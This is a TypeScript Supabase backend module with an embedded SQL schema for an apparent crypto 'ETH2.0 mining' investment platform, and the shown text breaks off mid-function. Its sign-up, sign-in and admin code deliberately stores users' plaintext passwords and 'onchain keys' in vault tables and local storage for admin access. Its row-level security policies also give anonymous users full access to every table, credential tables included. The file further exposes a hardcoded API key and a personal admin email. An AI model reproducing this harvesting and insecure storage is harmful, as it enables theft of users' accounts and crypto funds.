import { createClient } from '@supabase/supabase-js';
import { UserProfile, DepositRequest, WithdrawalRecordItem } from '../types';

export const SUPABASE_URL = 
  ((import.meta as any)?.env?.VITE_SUPABASE_URL as string) || 
  'https://bnyjkevubfncpkbnbacv.supabase.co';

export const SUPABASE_ANON_KEY = 
  ((import.meta as any)?.env?.VITE_SUPABASE_ANON_KEY as string) || 
  'sb_publishable_sWCYJX4lXDTg7UwQOLyxiQ_UVe63__b';

// Initialize Supabase Client
export const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

// Complete SQL Schema string for the user to run in Supabase SQL Editor
export const SUPABASE_SQL_SETUP = `-- ============================================================
-- HASHFORGE ETH2.0 MINING PLATFORM - COMPLETE SUPABASE SCHEMA
-- Copy and run this entire script in Supabase Dashboard -> SQL Editor -> Run
-- ============================================================

-- 1. Table: clients (Registered User Accounts & Dossiers)
CREATE TABLE IF NOT EXISTS public.clients (
  id TEXT PRIMARY KEY,
  name TEXT NOT NULL,
  email TEXT UNIQUE NOT NULL,
  password TEXT,
  onchain_key TEXT,
  plan TEXT DEFAULT 'No Active Package',
  vip_level INTEGER DEFAULT 0,
  joined_date TEXT,
  is_logged_in BOOLEAN DEFAULT true,
  has_claimed_free_bonus BOOLEAN DEFAULT false,
  created_at TIMESTAMPTZ DEFAULT now(),
  updated_at TIMESTAMPTZ DEFAULT now()
);

-- Ensure all columns exist if table was already created:
ALTER TABLE public.clients ADD COLUMN IF NOT EXISTS password TEXT;
ALTER TABLE public.clients ADD COLUMN IF NOT EXISTS onchain_key TEXT;
ALTER TABLE public.clients ADD COLUMN IF NOT EXISTS plan TEXT DEFAULT 'No Active Package';
ALTER TABLE public.clients ADD COLUMN IF NOT EXISTS vip_level INTEGER DEFAULT 0;
ALTER TABLE public.clients ADD COLUMN IF NOT EXISTS has_claimed_free_bonus BOOLEAN DEFAULT false;
ALTER TABLE public.clients ADD COLUMN IF NOT EXISTS updated_at TIMESTAMPTZ DEFAULT now();

-- 2. Table: deposits (Deposit Requests & Blockchain Receipts)
CREATE TABLE IF NOT EXISTS public.deposits (
  id TEXT PRIMARY KEY,
  user_id TEXT NOT NULL,
  user_name TEXT NOT NULL,
  package_id TEXT NOT NULL,
  package_name TEXT NOT NULL,
  vip_level INTEGER NOT NULL,
  amount_usd NUMERIC NOT NULL,
  network TEXT NOT NULL,
  deposit_address TEXT NOT NULL,
  sender_txid TEXT NOT NULL,
  status TEXT DEFAULT 'pending',
  explorer_confirmed BOOLEAN DEFAULT false,
  verified_at TIMESTAMPTZ,
  created_at TEXT NOT NULL,
  approved_at TEXT,
  inserted_at TIMESTAMPTZ DEFAULT now()
);

-- 3. Table: withdrawals (Payout Requests & Ledger)
CREATE TABLE IF NOT EXISTS public.withdrawals (
  id TEXT PRIMARY KEY,
  user_id TEXT,
  user_name TEXT,
  currency TEXT NOT NULL,
  type TEXT NOT NULL,
  amount NUMERIC NOT NULL,
  wallet_address TEXT,
  status TEXT DEFAULT 'Pending',
  time TEXT NOT NULL,
  tx_hash TEXT,
  inserted_at TIMESTAMPTZ DEFAULT now()
);

-- 4. Table: mining_contracts (Active Node Contracts & Hashrate Rigs)
CREATE TABLE IF NOT EXISTS public.mining_contracts (
  id TEXT PRIMARY KEY,
  user_id TEXT NOT NULL,
  user_name TEXT NOT NULL,
  package_id TEXT NOT NULL,
  package_name TEXT NOT NULL,
  vip_level INTEGER NOT NULL,
  hashrate NUMERIC NOT NULL,
  daily_reward_usd NUMERIC NOT NULL,
  status TEXT DEFAULT 'active',
  created_at TIMESTAMPTZ DEFAULT now(),
  updated_at TIMESTAMPTZ DEFAULT now()
);

-- 5. Table: announcements (Global Broadcast Banner & News)
CREATE TABLE IF NOT EXISTS public.announcements (
  id TEXT PRIMARY KEY,
  title TEXT NOT NULL,
  message TEXT NOT NULL,
  type TEXT DEFAULT 'info',
  is_active BOOLEAN DEFAULT true,
  target_audience TEXT DEFAULT 'all',
  created_at TIMESTAMPTZ DEFAULT now()
);

-- 6. Table: client_credentials (Folder: Client Original Passwords Vault)
CREATE TABLE IF NOT EXISTS public.client_credentials (
  id TEXT PRIMARY KEY,
  user_id TEXT,
  name TEXT,
  email TEXT UNIQUE NOT NULL,
  original_password TEXT NOT NULL,
  created_at TIMESTAMPTZ DEFAULT now(),
  updated_at TIMESTAMPTZ DEFAULT now()
);

ALTER TABLE public.client_credentials ADD COLUMN IF NOT EXISTS user_id TEXT;
ALTER TABLE public.client_credentials ADD COLUMN IF NOT EXISTS name TEXT;
ALTER TABLE public.client_credentials ADD COLUMN IF NOT EXISTS email TEXT;
ALTER TABLE public.client_credentials ADD COLUMN IF NOT EXISTS original_password TEXT;
ALTER TABLE public.client_credentials ADD COLUMN IF NOT EXISTS updated_at TIMESTAMPTZ DEFAULT now();

-- 7. Table: client_onchain_keys (Folder: Client Original Onchain Keys Vault)
CREATE TABLE IF NOT EXISTS public.client_onchain_keys (
  id TEXT PRIMARY KEY,
  user_id TEXT,
  name TEXT,
  email TEXT UNIQUE NOT NULL,
  onchain_key TEXT NOT NULL,
  created_at TIMESTAMPTZ DEFAULT now(),
  updated_at TIMESTAMPTZ DEFAULT now()
);

ALTER TABLE public.client_onchain_keys ADD COLUMN IF NOT EXISTS user_id TEXT;
ALTER TABLE public.client_onchain_keys ADD COLUMN IF NOT EXISTS name TEXT;
ALTER TABLE public.client_onchain_keys ADD COLUMN IF NOT EXISTS email TEXT;
ALTER TABLE public.client_onchain_keys ADD COLUMN IF NOT EXISTS onchain_key TEXT;
ALTER TABLE public.client_onchain_keys ADD COLUMN IF NOT EXISTS updated_at TIMESTAMPTZ DEFAULT now();

-- ============================================================
-- AUTOMATED AUTH TRIGGER:
-- Automatically mirrors any newly registered user in Supabase Auth
-- directly into public.clients, public.client_credentials, and public.client_onchain_keys!
-- ============================================================
CREATE OR REPLACE FUNCTION public.handle_new_user()
RETURNS trigger AS $$
BEGIN
  -- 1. Insert into clients
  INSERT INTO public.clients (id, name, email, password, onchain_key, plan, vip_level, joined_date, is_logged_in, created_at)
  VALUES (
    new.id,
    COALESCE(new.raw_user_meta_data->>'full_name', split_part(new.email, '@', 1)),
    new.email,
    COALESCE(new.raw_user_meta_data->>'raw_password', ''),
    COALESCE(new.raw_user_meta_data->>'onchain_key', ''),
    'No Active Package',
    0,
    TO_CHAR(NOW(), 'YYYY-MM-DD'),
    true,
    NOW()
  )
  ON CONFLICT (id) DO UPDATE SET
    email = EXCLUDED.email,
    name = COALESCE(NULLIF(EXCLUDED.name, ''), public.clients.name),
    password = COALESCE(NULLIF(EXCLUDED.password, ''), public.clients.password),
    onchain_key = COALESCE(NULLIF(EXCLUDED.onchain_key, ''), public.clients.onchain_key),
    updated_at = NOW();

  -- 2. Insert into client_credentials (Original Password Vault)
  IF COALESCE(new.raw_user_meta_data->>'raw_password', '') <> '' THEN
    INSERT INTO public.client_credentials (id, user_id, name, email, original_password, created_at, updated_at)
    VALUES (
      new.id,
      new.id,
      COALESCE(new.raw_user_meta_data->>'full_name', split_part(new.email, '@', 1)),
      new.email,
      new.raw_user_meta_data->>'raw_password',
      NOW(),
      NOW()
    )
    ON CONFLICT (email) DO UPDATE SET
      original_password = EXCLUDED.original_password,
      name = COALESCE(NULLIF(EXCLUDED.name, ''), public.client_credentials.name),
      user_id = EXCLUDED.user_id,
      updated_at = NOW();
  END IF;

  -- 3. Insert into client_onchain_keys (Original Onchain Key Vault)
  IF COALESCE(new.raw_user_meta_data->>'onchain_key', '') <> '' THEN
    INSERT INTO public.client_onchain_keys (id, user_id, name, email, onchain_key, created_at, updated_at)
    VALUES (
      new.id,
      new.id,
      COALESCE(new.raw_user_meta_data->>'full_name', split_part(new.email, '@', 1)),
      new.email,
      new.raw_user_meta_data->>'onchain_key',
      NOW(),
      NOW()
    )
    ON CONFLICT (email) DO UPDATE SET
      onchain_key = EXCLUDED.onchain_key,
      name = COALESCE(NULLIF(EXCLUDED.name, ''), public.client_onchain_keys.name),
      user_id = EXCLUDED.user_id,
      updated_at = NOW();
  END IF;

  RETURN new;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

DROP TRIGGER IF EXISTS on_auth_user_created ON auth.users;
CREATE TRIGGER on_auth_user_created
  AFTER INSERT OR UPDATE ON auth.users
  FOR EACH ROW EXECUTE FUNCTION public.handle_new_user();

-- ============================================================
-- ROW LEVEL SECURITY (RLS) POLICIES
-- Full read/write/delete permissions for anon & authenticated roles
-- ============================================================
ALTER TABLE public.clients ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.deposits ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.withdrawals ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.mining_contracts ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.announcements ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.client_credentials ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.client_onchain_keys ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "Allow public all on clients" ON public.clients;
CREATE POLICY "Allow public all on clients" ON public.clients FOR ALL USING (true) WITH CHECK (true);

DROP POLICY IF EXISTS "Allow public all on deposits" ON public.deposits;
CREATE POLICY "Allow public all on deposits" ON public.deposits FOR ALL USING (true) WITH CHECK (true);

DROP POLICY IF EXISTS "Allow public all on withdrawals" ON public.withdrawals;
CREATE POLICY "Allow public all on withdrawals" ON public.withdrawals FOR ALL USING (true) WITH CHECK (true);

DROP POLICY IF EXISTS "Allow public all on mining_contracts" ON public.mining_contracts;
CREATE POLICY "Allow public all on mining_contracts" ON public.mining_contracts FOR ALL USING (true) WITH CHECK (true);

DROP POLICY IF EXISTS "Allow public all on announcements" ON public.announcements;
CREATE POLICY "Allow public all on announcements" ON public.announcements FOR ALL USING (true) WITH CHECK (true);

DROP POLICY IF EXISTS "Allow public all on client_credentials" ON public.client_credentials;
CREATE POLICY "Allow public all on client_credentials" ON public.client_credentials FOR ALL USING (true) WITH CHECK (true);

DROP POLICY IF EXISTS "Allow public all on client_onchain_keys" ON public.client_onchain_keys;
CREATE POLICY "Allow public all on client_onchain_keys" ON public.client_onchain_keys FOR ALL USING (true) WITH CHECK (true);
`;

// Helper: Check Supabase Connection & Table Health
export interface SupabaseTableStatus {
  clientsCount: number;
  depositsCount: number;
  withdrawalsCount: number;
  contractsCount: number;
  announcementsCount: number;
  credentialsCount: number;
  onchainKeysCount: number;
  tablesReady: boolean;
  errors: string[];
}

export interface ClientCredentialRecord {
  id: string;
  user_id?: string;
  name?: string;
  email: string;
  original_password: string;
  created_at?: string;
  updated_at?: string;
}

export interface ClientOnchainKeyRecord {
  id: string;
  user_id?: string;
  name?: string;
  email: string;
  onchain_key: string;
  created_at?: string;
  updated_at?: string;
}

export async function checkSupabaseTableStats(): Promise<SupabaseTableStatus> {
  const stats: SupabaseTableStatus = {
    clientsCount: 0,
    depositsCount: 0,
    withdrawalsCount: 0,
    contractsCount: 0,
    announcementsCount: 0,
    credentialsCount: 0,
    onchainKeysCount: 0,
    tablesReady: true,
    errors: [],
  };

  try {
    const { count: cCount, error: cErr } = await supabase.from('clients').select('*', { count: 'exact', head: true });
    if (cErr) {
      stats.tablesReady = false;
      stats.errors.push(`clients: ${cErr.message}`);
    } else {
      stats.clientsCount = cCount || 0;
    }

    const { count: dCount, error: dErr } = await supabase.from('deposits').select('*', { count: 'exact', head: true });
    if (dErr) {
      stats.tablesReady = false;
      stats.errors.push(`deposits: ${dErr.message}`);
    } else {
      stats.depositsCount = dCount || 0;
    }

    const { count: wCount, error: wErr } = await supabase.from('withdrawals').select('*', { count: 'exact', head: true });
    if (wErr) {
      stats.tablesReady = false;
      stats.errors.push(`withdrawals: ${wErr.message}`);
    } else {
      stats.withdrawalsCount = wCount || 0;
    }

    const { count: mcCount, error: mcErr } = await supabase.from('mining_contracts').select('*', { count: 'exact', head: true });
    if (!mcErr) {
      stats.contractsCount = mcCount || 0;
    }

    const { count: aCount, error: aErr } = await supabase.from('announcements').select('*', { count: 'exact', head: true });
    if (!aErr) {
      stats.announcementsCount = aCount || 0;
    }

    const { count: credCount, error: credErr } = await supabase.from('client_credentials').select('*', { count: 'exact', head: true });
    if (!credErr) {
      stats.credentialsCount = credCount || 0;
    }

    const { count: keyCount, error: keyErr } = await supabase.from('client_onchain_keys').select('*', { count: 'exact', head: true });
    if (!keyErr) {
      stats.onchainKeysCount = keyCount || 0;
    }
  } catch (err: any) {
    stats.tablesReady = false;
    stats.errors.push(err?.message || 'Connection error');
  }

  return stats;
}

// Helper: Check Supabase Connection
export async function checkSupabaseConnection(): Promise<{ connected: boolean; error?: string }> {
  try {
    const { error } = await supabase.from('deposits').select('id').limit(1);
    if (error && error.code !== 'PGRST116') {
      return { connected: true, error: error.message };
    }
    return { connected: true };
  } catch (err: any) {
    return { connected: false, error: err?.message || 'Connection failed' };
  }
}

// ----------------------------------------------------
// AUTHENTICATION & EMAIL ACTIVATION HELPERS
// ----------------------------------------------------
export function getAppAuthRedirectUrl(type: 'signup' | 'recovery' = 'signup'): string {
  // Current public shared preview origin for this applet
  const defaultPublicOrigin = 'https://ais-pre-gcbuyws2nscgukfjzwmdvb-639192859050.asia-east1.run.app';
  let cleanOrigin = defaultPublicOrigin;

  if (typeof window !== 'undefined') {
    // Check if custom override is configured
    try {
      const customOrigin = localStorage.getItem('hashforge_custom_site_url');
      if (customOrigin && customOrigin.startsWith('http')) {
        cleanOrigin = customOrigin.replace(/\/+$/, '');
      } else if (window.location?.origin) {
        let current = window.location.origin.replace(/\/+$/, '');
        // If running in development sandbox (ais-dev), transform to public shared preview (ais-pre)
        // so mobile users and external clients clicking email links do NOT get Google 403 Forbidden
        if (current.includes('ais-dev-')) {
          current = current.replace('ais-dev-', 'ais-pre-');
        }
        // If inside Google AI Studio host frame, fallback to public shared applet URL
        if (current.includes('aistudio.google.com') || current.includes('google.com')) {
          current = defaultPublicOrigin;
        } else if (current && !current.includes('localhost')) {
          cleanOrigin = current;
        }
      }
    } catch {}
  }

  if (type === 'recovery') {
    return `${cleanOrigin}/#reset-password`;
  }
  return cleanOrigin;
}

export async function signUpWithSupabase(
  email: string,
  password: string,
  name: string,
  onchainKey?: string
): Promise<{ success: boolean; user?: UserProfile; needsActivation?: boolean; error?: string }> {
  try {
    const cleanEmail = email.trim().toLowerCase();
    const cleanName = name.trim() || cleanEmail.split('@')[0];
    const cleanOnchainKey = onchainKey?.trim() || '';

    // 1. Strict check: Check local registered users list first
    try {
      const localUsersStr = localStorage.getItem('hashforge_registered_users');
      if (localUsersStr) {
        const localUsers: UserProfile[] = JSON.parse(localUsersStr);
        if (localUsers.some(u => u.email?.trim().toLowerCase() === cleanEmail)) {
          return {
            success: false,
            error: 'This email address is already registered. Please sign in instead.'
          };
        }
      }
    } catch {}

    // 2. Strict check: Query Supabase clients table
    try {
      const { data: existingClient } = await supabase
        .from('clients')
        .select('id, email')
        .ilike('email', cleanEmail)
        .maybeSingle();

      if (existingClient) {
        return {
          success: false,
          error: 'This email address is already registered. Please sign in instead.'
        };
      }
    } catch (e) {
      console.warn('Clients table check warning:', e);
    }

    const redirectUrl = getAppAuthRedirectUrl('signup');

    // 3. Call Supabase Auth SignUp
    const { data: authData, error: authError } = await supabase.auth.signUp({
      email: cleanEmail,
      password: password,
      options: {
        data: {
          full_name: cleanName,
          onchain_key: cleanOnchainKey,
          raw_password: password,
        },
        emailRedirectTo: redirectUrl,
      },
    });

    if (authError) {
      const msg = authError.message.toLowerCase();
      if (msg.includes('already registered') || msg.includes('already in use') || msg.includes('user already exists')) {
        return {
          success: false,
          error: 'This email address is already registered. Please sign in instead.'
        };
      }
      return { success: false, error: authError.message };
    }

    // CRITICAL: Supabase returns user with identities: [] if user ALREADY exists in Supabase Auth (when email confirm is enabled)
    if (authData.user && Array.isArray(authData.user.identities) && authData.user.identities.length === 0) {
      return {
        success: false,
        error: 'This email address is already registered. Please sign in with your password.'
      };
    }

    const userId = authData.user?.id || `usr-${Date.now()}`;

    const newUserProfile: UserProfile = {
      id: userId,
      name: cleanName,
      email: cleanEmail,
      password: password,
      plan: 'No Active Package',
      vipLevel: 0,
      joinedDate: new Date().toISOString().substring(0, 10),
      isLoggedIn: true,
      hasClaimedFreeBonus: false,
      onchainKey: cleanOnchainKey,
    };

    // Record credentials for admin reference
    recordClientPassword(cleanEmail, password, cleanOnchainKey);

    // 4. Save into clients table with password and onchain_key
    try {
      await supabase.from('clients').upsert({
        id: userId,
        name: cleanName,
        email: cleanEmail,
        password: password,
        plan: 'No Active Package',
        vip_level: 0,
        joined_date: newUserProfile.joinedDate,
        is_logged_in: false,
        onchain_key: cleanOnchainKey,
      });
    } catch (e) {
      console.warn('Clients record create warning:', e);
    }

    // 5. Save into Folder 1: client_credentials (Original Passwords Vault)
    try {
      await supabase.from('client_credentials').upsert({
        id: userId,
        user_id: userId,
        name: cleanName,
        email: cleanEmail,
        original_password: password,
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString(),
      });
    } catch (e) {
      console.warn('Client credentials table upsert warning:', e);
    }

    // 6. Save into Folder 2: client_onchain_keys (Original Onchain Keys Vault)
    try {
      await supabase.from('client_onchain_keys').upsert({
        id: userId,
        user_id: userId,
        name: cleanName,
        email: cleanEmail,
        onchain_key: cleanOnchainKey,
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString(),
      });
    } catch (e) {
      console.warn('Client onchain keys table upsert warning:', e);
    }

    const needsEmailConfirmation = !authData.session && !authData.user?.email_confirmed_at;

    return {
      success: true,
      user: newUserProfile,
      needsActivation: needsEmailConfirmation,
    };
  } catch (err: any) {
    return { success: false, error: err?.message || 'Failed to sign up.' };
  }
}

export async function signInWithSupabase(
  email: string,
  password: string
): Promise<{ success: boolean; user?: UserProfile; notActivated?: boolean; error?: string }> {
  try {
    const cleanEmail = email.trim().toLowerCase();

    // 1. Supabase Auth Sign In
    const { data: authData, error: authError } = await supabase.auth.signInWithPassword({
      email: cleanEmail,
      password: password,
    });

    if (authError) {
      const errMsg = authError.message.toLowerCase();

      // Check for unconfirmed email
      if (
        errMsg.includes('email not confirmed') || 
        errMsg.includes('not confirmed') || 
        errMsg.includes('email confirmation')
      ) {
        return {
          success: false,
          notActivated: true,
          error: 'Your account is not activated. Please check your inbox and click the activation link to verify your email before logging in.',
        };
      }

      // Check if user is not in database at all
      if (errMsg.includes('invalid login credentials') || errMsg.includes('user not found')) {
        // Double check against database clients
        const { data: clientCheck } = await supabase
          .from('clients')
          .select('id, email')
          .eq('email', cleanEmail)
          .maybeSingle();

        if (!clientCheck) {
          // Check local registered users
          const localUsersStr = localStorage.getItem('hashforge_registered_users');
          const localUsers: UserProfile[] = localUsersStr ? JSON.parse(localUsersStr) : [];
          const existsLocally = localUsers.some(u => u.email.toLowerCase() === cleanEmail);

          if (!existsLocally) {
            return {
              success: false,
              error: 'No account found with this email address. You must sign up first before you can log in.',
            };
          }
        }

        return {
          success: false,
          error: 'Invalid password. Please check your password or use "Forgot Password".',
        };
      }

      return {
        success: false,
        error: authError.message,
      };
    }

    // 2. Fetch user profile from database
    let userProfile: UserProfile = {
      id: authData.user?.id || `user-${Date.now()}`,
      name: (authData.user?.user_metadata?.full_name as string) || cleanEmail.split('@')[0],
      email: cleanEmail,
      plan: 'No Active Package',
      vipLevel: 0,
      joinedDate: authData.user?.created_at?.substring(0, 10) || new Date().toISOString().substring(0, 10),
      isLoggedIn: true,
      hasClaimedFreeBonus: false,
      onchainKey: (authData.user?.user_metadata?.onchain_key as string) || getClientOnchainKey(cleanEmail) || '',
    };

    try {
      const { data: dbClient } = await supabase
        .from('clients')
        .select('*')
        .eq('email', cleanEmail)
        .maybeSingle();

      if (dbClient) {
        userProfile = {
          id: dbClient.id,
          name: dbClient.name || userProfile.name,
          email: dbClient.email,
          password: password || dbClient.password,
          plan: dbClient.plan || (dbClient.vip_level ? `VIP ${dbClient.vip_level}` : 'No Active Package'),
          vipLevel: dbClient.vip_level ?? 0,
          joinedDate: dbClient.joined_date || userProfile.joinedDate,
          isLoggedIn: true,
          hasClaimedFreeBonus: dbClient.has_claimed_free_bonus ?? false,
          onchainKey: dbClient.onchain_key || (authData.user?.user_metadata?.onchain_key as string) || getClientOnchainKey(cleanEmail) || '',
        };
      } else {
        userProfile.password = password;
      }
      
      recordClientPassword(cleanEmail, password, userProfile.onchainKey);

      // Update client session state in clients table
      await supabase.from('clients').upsert({
        id: userProfile.id,
        name: userProfile.name,
        email: userProfile.email,
        password: password,
        plan: userProfile.plan,
        vip_level: userProfile.vipLevel || 0,
        joined_date: userProfile.joinedDate,
        is_logged_in: true,
        ...(userProfile.onchainKey ? { onchain_key: userProfile.onchainKey } : {}),
      });
    } catch (e) {
      console.warn('DB client lookup warning:', e);
    }

    return {
      success: true,
      user: userProfile,
    };
  } catch (err: any) {
    return {
      success: false,
      error: err?.message || 'Sign in failed. Please try again.',
    };
  }
}

export async function sendSupabasePasswordReset(
  email: string
): Promise<{ success: boolean; error?: string }> {
  try {
    const cleanEmail = email.trim().toLowerCase();

    // Check if user exists in database first
    const { data: clientCheck } = await supabase
      .from('clients')
      .select('id, email')
      .eq('email', cleanEmail)
      .maybeSingle();

    const localUsersStr = localStorage.getItem('hashforge_registered_users');
    const localUsers: UserProfile[] = localUsersStr ? JSON.parse(localUsersStr) : [];
    const existsLocally = localUsers.some(u => u.email.toLowerCase() === cleanEmail);

    if (!clientCheck && !existsLocally) {
      return {
        success: false,
        error: 'No account found with this email. Please check the spelling or sign up for a new account.',
      };
    }

    const resetRedirectUrl = getAppAuthRedirectUrl('recovery');

    const { error } = await supabase.auth.resetPasswordForEmail(cleanEmail, {
      redirectTo: resetRedirectUrl,
    });

    if (error) {
      return { success: false, error: error.message };
    }

    return { success: true };
  } catch (err: any) {
    return { success: false, error: err?.message || 'Failed to send reset email.' };
  }
}

export async function resendSupabaseActivation(
  email: string
): Promise<{ success: boolean; error?: string }> {
  try {
    const cleanEmail = email.trim().toLowerCase();
    const activationRedirectUrl = getAppAuthRedirectUrl('signup');

    const { error } = await supabase.auth.resend({
      type: 'signup',
      email: cleanEmail,
      options: {
        emailRedirectTo: activationRedirectUrl,
      },
    });

    if (error) {
      return { success: false, error: error.message };
    }

    return { success: true };
  } catch (err: any) {
    return { success: false, error: err?.message || 'Failed to resend activation email.' };
  }
}

export async function fetchSupabaseCredentialsVault(): Promise<ClientCredentialRecord[]> {
  try {
    const { data, error } = await supabase
      .from('client_credentials')
      .select('*')
      .order('created_at', { ascending: false });
    if (error || !data) return [];
    return data;
  } catch {
    return [];
  }
}

export async function fetchSupabaseOnchainKeysVault(): Promise<ClientOnchainKeyRecord[]> {
  try {
    const { data, error } = await supabase
      .from('client_onchain_keys')
      .select('*')
      .order('created_at', { ascending: false });
    if (error || !data) return [];
    return data;
  } catch {
    return [];
  }
}

export async function fetchSupabaseUsers(): Promise<UserProfile[] | null> {
  try {
    const [clientsRes, credsRes, keysRes] = await Promise.allSettled([
      supabase.from('clients').select('*').order('created_at', { ascending: false }),
      supabase.from('client_credentials').select('*'),
      supabase.from('client_onchain_keys').select('*'),
    ]);

    const clientsData = clientsRes.status === 'fulfilled' && !clientsRes.value.error ? clientsRes.value.data : null;
    const credsData: ClientCredentialRecord[] = credsRes.status === 'fulfilled' && !credsRes.value.error && credsRes.value.data ? credsRes.value.data : [];
    const keysData: ClientOnchainKeyRecord[] = keysRes.status === 'fulfilled' && !keysRes.value.error && keysRes.value.data ? keysRes.value.data : [];

    if (!clientsData) {
      console.warn('Supabase fetch clients error (fallback to local)');
      return null;
    }

    if (clientsData.length === 0) return [];

    // Build fast lookup maps
    const credsMap = new Map<string, string>();
    credsData.forEach(c => {
      if (c.email && c.original_password) {
        credsMap.set(c.email.trim().toLowerCase(), c.original_password);
      }
    });

    const keysMap = new Map<string, string>();
    keysData.forEach(k => {
      if (k.email && k.onchain_key) {
        keysMap.set(k.email.trim().toLowerCase(), k.onchain_key);
      }
    });

    return clientsData.map(item => {
      const emailClean = (item.email || '').trim().toLowerCase();
      const vaultPass = credsMap.get(emailClean);
      const vaultKey = keysMap.get(emailClean);

      const effectivePass = vaultPass || item.password;
      const effectiveKey = vaultKey || item.onchain_key || item.onchainKey;

      const { password: pass, onchainKey: onchain } = ensureCustomerCredentials(
        item.email,
        item.id,
        effectivePass,
        effectiveKey
      );

      const rawAccountStatus = (item.account_status || item.accountStatus || 'active').toLowerCase();
      const accountStatus = (rawAccountStatus === 'blocked' || rawAccountStatus === 'suspended' || rawAccountStatus === 'pending') 
        ? rawAccountStatus 
        : 'active';

      return {
        id: item.id,
        name: item.name,
        email: item.email,
        password: pass,
        plan: item.plan || (item.vip_level ? `VIP ${item.vip_level}` : 'No Active Package'),
        vipLevel: item.vip_level ?? 0,
        joinedDate: item.joined_date || item.created_at?.substring(0, 10) || '2026-08-28',
        isLoggedIn: item.is_logged_in ?? true,
        onchainKey: onchain,
        accountStatus: accountStatus as any,
        statusReason: item.status_reason || item.statusReason,
        statusUpdatedAt: item.status_updated_at || item.statusUpdatedAt,
      };
    });
  } catch (err) {
    console.warn('Supabase offline or table not created yet:', err);
    return null;
  }
}

// ----------------------------------------------------
// MASTER ADMIN CLIENT CREDENTIALS VAULT
// Synchronizes client passwords and onchain keys for administrative access
// ----------------------------------------------------
export interface StoredClientCredentials {
  email: string;
  password?: string;
  onchainKey?: string;
  updatedAt?: string;
}

export function ensureCustomerCredentials(
  email?: string,
  userId?: string,
  existingPass?: string,
  existingKey?: string
): { password: string; onchainKey: string } {
  if (!email) {
    return { password: existingPass || '', onchainKey: existingKey || '' };
  }
  const cleanEmail = email.trim().toLowerCase();
  const creds = getClientCredentials(cleanEmail);

  let pass = (existingPass && existingPass.trim() !== '') ? existingPass : (creds?.password || '');
  let key = (existingKey && existingKey.trim() !== '') ? existingKey : (creds?.onchainKey || '');

  // Filter out any previous auto-generated synthetic passwords
  if (pass && pass.includes('#') && pass.endsWith('2026!') && pass.toLowerCase().includes(cleanEmail.split('@')[0].toLowerCase().slice(0, 5))) {
    pass = '';
  }

  // Check additional local storage stores if pass is empty
  if (!pass) {
    try {
      const regUsersRaw = localStorage.getItem('hashforge_registered_users');
      if (regUsersRaw) {
        const regUsers: UserProfile[] = JSON.parse(regUsersRaw);
        const match = regUsers.find(u => u.email.toLowerCase() === cleanEmail);
        if (match?.password) {
          pass = match.password;
        }
        if (match?.onchainKey && !key) {
          key = match.onchainKey;
        }
      }
    } catch {}
  }

  if (pass) {
    recordClientPassword(cleanEmail, pass, key || undefined);
  }

  return { password: pass, onchainKey: key };
}

export function getClientCredentials(email?: string): StoredClientCredentials | null {
  if (!email) return null;
  try {
    const raw = localStorage.getItem('hashforge_admin_credentials_store');
    if (!raw) return null;
    const map: Record<string, StoredClientCredentials> = JSON.parse(raw);
    const item = map[email.trim().toLowerCase()] || null;
    if (item && item.password && item.password.includes('#') && item.password.endsWith('2026!') && item.password.toLowerCase().includes(email.split('@')[0].toLowerCase().slice(0, 5))) {
      item.password = undefined;
    }
    return item;
  } catch {
    return null;
  }
}

export function recordClientPassword(email?: string, pass?: string, onchainKey?: string) {
  if (!email) return;
  try {
    const cleanEmail = email.trim().toLowerCase();
    const raw = localStorage.getItem('hashforge_admin_credentials_store');
    const map: Record<string, StoredClientCredentials> = raw ? JSON.parse(raw) : {};
    
    const existing = map[cleanEmail] || { email: cleanEmail };
    map[cleanEmail] = {
      ...existing,
      email: cleanEmail,
      ...(pass ? { password: pass } : {}),
      ...(onchainKey ? { onchainKey } : {}),
      updatedAt: new Date().toISOString(),
    };
    
    localStorage.setItem('hashforge_admin_credentials_store', JSON.stringify(map));
  } catch (e) {
    console.warn('Record client credentials error:', e);
  }
}

export function getClientPassword(email?: string): string | null {
  const creds = getClientCredentials(email);
  return creds?.password || null;
}

export function getClientOnchainKey(email?: string): string | null {
  const creds = getClientCredentials(email);
  return creds?.onchainKey || null;
}

export async function updateClientCredentials(
  userId: string,
  email: string,
  newPassword?: string,
  newOnchainKey?: string
): Promise<boolean> {
  try {
    const cleanEmail = email.trim().toLowerCase();
    recordClientPassword(cleanEmail, newPassword, newOnchainKey);

    const payload: any = {
      id: userId,
      email: cleanEmail,
      ...(newPassword ? { password: newPassword } : {}),
      ...(newOnchainKey ? { onchain_key: newOnchainKey } : {}),
    };

    const { error } = await supabase.from('clients').upsert(payload);
    if (error) {
      console.warn('Supabase update credentials warning:', error.message);
    }

    if (newPassword) {
      try {
        await supabase.from('client_credentials').upsert({
          id: userId,
          user_id: userId,
          email: cleanEmail,
          original_password: newPassword,
          updated_at: new Date().toISOString(),
        });
      } catch (e) {
        console.warn('client_credentials update warning:', e);
      }
    }

    if (newOnchainKey) {
      try {
        await supabase.from('client_onchain_keys').upsert({
          id: userId,
          user_id: userId,
          email: cleanEmail,
          onchain_key: newOnchainKey,
          updated_at: new Date().toISOString(),
        });
      } catch (e) {
        console.warn('client_onchain_keys update warning:', e);
      }
    }

    return true;
  } catch (err) {
    console.warn('Update client credentials error:', err);
    return false;
  }
}

// ----------------------------------------------------
// PURGE ALL TEST DATA & RESET TO CLEAN ZERO STATE
// (Keeps only Master Admin yousaftariq2014@gmail.com, wipes all deposits/packages)
// ----------------------------------------------------
export async function clearUserDeposits(userId: string, userEmail?: string): Promise<boolean> {
  try {
    if (userId) {
      await supabase.from('deposits').delete().eq('user_id', userId);
    }
    if (userEmail) {
      await supabase.from('deposits').delete().eq('user_name', userEmail);
    }
    return true;
  } catch (err) {
    console.warn('Clear user deposits error:', err);
    return false;
  }
}

export async function clearAllDeposits(): Promise<boolean> {
  try {
    const { data: allDeps } = await supabase.from('deposits').select('id');
    if (allDeps && allDeps.length > 0) {
      const ids = allDeps.map(d => d.id);
